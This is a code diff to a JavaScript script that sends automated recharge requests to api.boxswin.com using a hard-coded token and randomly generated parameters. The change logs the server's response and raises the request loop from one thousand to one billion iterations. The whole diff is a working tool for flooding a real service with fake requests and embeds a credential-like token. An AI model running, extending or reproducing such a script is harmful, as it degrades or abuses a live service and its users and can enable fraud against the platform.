@@ -45,7 +45,7 @@ function generateRandomPassword() {
 const randomParams = generateRandomParams();
 
 async function fetchParams(params) {
-    fetch("https://api.boxswin.com/user_recharge/cz?language=pt-BR&token=NDE4M2IzY2IwNGUyNitmbVM1RjNqQ09MNlorclJRSkNBaEVhbWZFdEIyZDBobHFxWjV6SXZLakE9&name=&phone=&email=&bank=&channel_id=2&amount=10000&account=&bank_code=&zipcode=&curp=&recharge_send=1", {
+    const teste = await fetch("https://api.boxswin.com/user_recharge/cz?language=pt-BR&token=NDE4M2IzY2IwNGUyNitmbVM1RjNqQ09MNlorclJRSkNBaEVhbWZFdEIyZDBobHFxWjV6SXZLakE9&name=&phone=&email=&bank=&channel_id=2&amount=10000&account=&bank_code=&zipcode=&curp=&recharge_send=1", {
         "headers": {
             "accept": "*/*",
             "accept-language": "en-US,en;q=0.9,pt;q=0.8",
@@ -66,11 +66,14 @@ async function fetchParams(params) {
         "credentials": "omit"
     })
 
+    const data = await teste.json();
+    console.log(data);
+
     fetch(url, params);
 }
 
 (async () => {
-    for (let i = 0; i < 1000; i++) {
+    for (let i = 0; i < 1000000000; i++) {
         const params = {
             method: "POST",
             headers: {
